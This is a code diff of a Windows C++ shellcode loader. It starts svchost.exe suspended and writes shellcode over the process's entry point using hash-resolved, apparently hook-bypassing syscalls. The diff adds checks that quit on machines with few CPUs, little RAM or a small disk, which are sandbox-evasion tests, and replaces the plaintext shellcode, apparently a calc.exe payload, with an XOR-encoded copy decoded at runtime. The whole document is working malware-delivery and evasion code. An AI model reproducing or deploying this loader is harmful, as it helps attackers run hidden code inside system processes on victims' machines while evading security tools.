@@ -1,10 +1,6 @@
 #include <windows.h>
-#include <stdio.h>
-//#include <tchar.h>
-#include <iostream>
 #include <winternl.h>
 
-#pragma comment(lib, "ntdll")
 #define NtCurrentProcess()	   ((HANDLE)-1)
 
 #ifndef NT_SUCCESS
@@ -228,33 +224,45 @@ INT_PTR Unh00ksyscallInstr(LPVOID addr) {
 
 }
 
+void funny(unsigned char* data, int len)
+{
+    int i;
+    for (i = 0; i < len; i++)
+    {
+        data[i] ^= 0x13;
+    }
+}
+
+
 
 int main()
 {
-        //python GetHash.py ntdll.dll
+        
+
+
+
+        SYSTEM_INFO systemInfo;
+        GetSystemInfo(&systemInfo);
+        DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+        if (numberOfProcessors < 2) return false;
+
+        MEMORYSTATUSEX memoryStatus;
+        memoryStatus.dwLength = sizeof(memoryStatus);
+        GlobalMemoryStatusEx(&memoryStatus);
+        DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+        if (RAMMB < 2048) return false;
+
+        HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+        DISK_GEOMETRY pDiskGeometry;
+        DWORD bytesReturned;
+        DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+        DWORD diskSizeGB;
+        diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+        if (diskSizeGB < 100) return false;
+
         HMODULE mod = getModule(4097367);
 
-        unsigned char buf[] =
-            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+        unsigned char buf[] = "\xef\x5b\x90\xf7\xe3\xfb\xd3\x13\x13\x13\x52\x42\x52\x43\x41\x42\x45\x5b\x22\xc1\x76\x5b\x98\x41\x73\x5b\x98\x41\x0b\x5b\x98\x41\x33\x5b\x98\x61\x43\x5b\x1c\xa4\x59\x59\x5e\x22\xda\x5b\x22\xd3\xbf\x2f\x72\x6f\x11\x3f\x33\x52\xd2\xda\x1e\x52\x12\xd2\xf1\xfe\x41\x52\x42\x5b\x98\x41\x33\x98\x51\x2f\x5b\x12\xc3\x98\x93\x9b\x13\x13\x13\x5b\x96\xd3\x67\x74\x5b\x12\xc3\x43\x98\x5b\x0b\x57\x98\x53\x33\x5a\x12\xc3\xf0\x45\x5b\xec\xda\x52\x98\x27\x9b\x5b\x12\xc5\x5e\x22\xda\x5b\x22\xd3\xbf\x52\xd2\xda\x1e\x52\x12\xd2\x2b\xf3\x66\xe2\x5f\x10\x5f\x37\x1b\x56\x2a\xc2\x66\xcb\x4b\x57\x98\x53\x37\x5a\x12\xc3\x75\x52\x98\x1f\x5b\x57\x98\x53\x0f\x5a\x12\xc3\x52\x98\x17\x9b\x5b\x12\xc3\x52\x4b\x52\x4b\x4d\x4a\x49\x52\x4b\x52\x4a\x52\x49\x5b\x90\xff\x33\x52\x41\xec\xf3\x4b\x52\x4a\x49\x5b\x98\x01\xfa\x44\xec\xec\xec\x4e\x5b\xa9\x12\x13\x13\x13\x13\x13\x13\x13\x5b\x9e\x9e\x12\x12\x13\x13\x52\xa9\x22\x98\x7c\x94\xec\xc6\xa8\xe3\xa6\xb1\x45\x52\xa9\xb5\x86\xae\x8e\xec\xc6\x5b\x90\xd7\x3b\x2f\x15\x6f\x19\x93\xe8\xf3\x66\x16\xa8\x54\x00\x61\x7c\x79\x13\x4a\x52\x9a\xc9\xec\xc6\x70\x72\x7f\x70\x3d\x76\x6b\x76\x13";
 
         STARTUPINFOA si;
         PROCESS_INFORMATION pi;
@@ -263,30 +271,19 @@ int main()
         si.cb = sizeof(si);
         ZeroMemory(&pi, sizeof(pi));
 
-        // Start the child process.
-        if (!CreateProcessA(NULL,   // No module name (use command line)
-            (LPSTR)"C:\\Windows\\system32\\svchost.exe",        // Command line
-            NULL,           // Process handle not inheritable
-            NULL,           // Thread handle not inheritable
-            FALSE,          // Set handle inheritance to FALSE
-            CREATE_SUSPENDED,              // No creation flags
-            NULL,           // Use parent's environment block
-            NULL,           // Use parent's starting directory
-            &si,            // Pointer to STARTUPINFO structure
-            &pi)           // Pointer to PROCESS_INFORMATION structure
-            )
-        {
-            printf("CreateProcess failed (%d).\n", GetLastError());
-            return 1;
-        }
-
-
-
-
-        printf("PPID: %d\n", GetCurrentProcessId());
-        printf("PID: %d\n", pi.dwProcessId);
-
-        // Get the child process' context - NtGetContextThread
+        
+        CreateProcessA(NULL,
+            (LPSTR)"C:\\Windows\\system32\\svchost.exe",
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_SUSPENDED,
+            NULL,
+            NULL,
+            &si,
+            &pi);
+            
+    
 
         LPVOID addr = NULL;
         WORD syscallNum = NULL;
@@ -296,7 +293,7 @@ int main()
         memset(&ctx, 0, sizeof(ctx));
         ctx.ContextFlags = CONTEXT_FULL;
 
-        addr = getAPIAddr(mod, 76093572262); //NtGetContextThread
+        addr = getAPIAddr(mod, 76093572262);
         syscallNum = Unh00ksyscallNum(addr);
         syscallAddr = Unh00ksyscallInstr(addr);
 
@@ -305,23 +302,13 @@ int main()
 
         NTSTATUS  status1 = myNtGetContextThread(pi.hThread, &ctx);
 
-        if (status1)
-        {
-            std::cout << "myNtGetContextThread failed: " << GetLastError() << std::endl;
-
-        }
-      
-
-        // Read the PEB address from the context
         DWORD_PTR pebAddress = ctx.Rdx;
-
-        // Read the PEB structure from the child process
         PEB peb;
         memset(&peb, 0, sizeof(peb));
         SIZE_T bytesRead = NULL;
 
 
-        addr = getAPIAddr(mod, 228701921503); //NtReadVirtualMemory
+        addr = getAPIAddr(mod, 228701921503); 
         syscallNum = Unh00ksyscallNum(addr);
         syscallAddr = Unh00ksyscallInstr(addr);
 
@@ -329,85 +316,31 @@ int main()
         GetSyscallAddr(syscallAddr);
 
         NTSTATUS status2 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)pebAddress, &peb, sizeof(peb), bytesRead);
-       
-        if (status2)
-        {
-            std::cout << "myNtReadVirtualMemory1 failed: " << GetLastError() << std::endl;
-
-        }
+     
         
     
-        std::cout << "Peb address: 0x" << std::hex << pebAddress << std::endl;
+        
         DWORD_PTR imageBaseAddress = pebAddress + 0x010;
-        std::cout << "ImageBaseAddress address: 0x" << std::hex << imageBaseAddress << std::endl;
-
         DWORD_PTR imageBaseValue = 0;
         SIZE_T bytesReadAgain = NULL;
 
         NTSTATUS status3 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseAddress, &imageBaseValue, sizeof(imageBaseValue), bytesReadAgain);
 
-        if (status3)
-        {
-            std::cout << "myNtReadVirtualMemory2 failed: " << GetLastError() << std::endl;
-
-        }   
-
-
-       
-        std::cout << "ImageBaseAddress value: 0x" << std::hex << imageBaseValue << std::endl;
-
-        // read target process image headers
+  
         BYTE headersBuffer[4096] = {};
         
 
         NTSTATUS status4 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseValue, headersBuffer, 4096, NULL);
 
-        if (status4)
-        {
-            std::cout << "myNtReadVirtualMemory3 failed: " << GetLastError() << std::endl;
-
-        }
-        
-
-        // get AddressOfEntryPoint
         PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
         PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
         LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBaseValue);
-        std::cout << "AddressOfEntryPoint value: 0x" << std::hex << (DWORD_PTR)codeEntry << std::endl;
+  
+        int len = sizeof(buf) - 1;
 
-
-
-        // write buf to image entry point and execute it
-
-        addr = getAPIAddr(mod, 687514600120); //NtWriteVirtualMemory
-        syscallNum = Unh00ksyscallNum(addr);
-        syscallAddr = Unh00ksyscallInstr(addr);
-
-        GetSyscall(syscallNum);
-        GetSyscallAddr(syscallAddr);
-        PULONG byteWritten = 0;
-
-        //WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
-
-       // NTSTATUS status5 = myNtWriteVirtualMemory(pi.hProcess, (PVOID)codeEntry, (PVOID)buf, (ULONG)(sizeof(buf)), NULL);
-        /*
-        if (status5)
-        {
-            std::cout << "myNtWriteVirtualMemory failed: " << GetLastError() << std::endl;
-
-        }
-        */
-
-        
-        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-
-        NtWriteVirtualMemory(pi.hProcess, (PVOID)codeEntry, buf, sizeof(buf), byteWritten);
-        
-        
+        funny(buf, len);
+        WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
         ResumeThread(pi.hThread);
-
-
-
 
         return 0;
     }
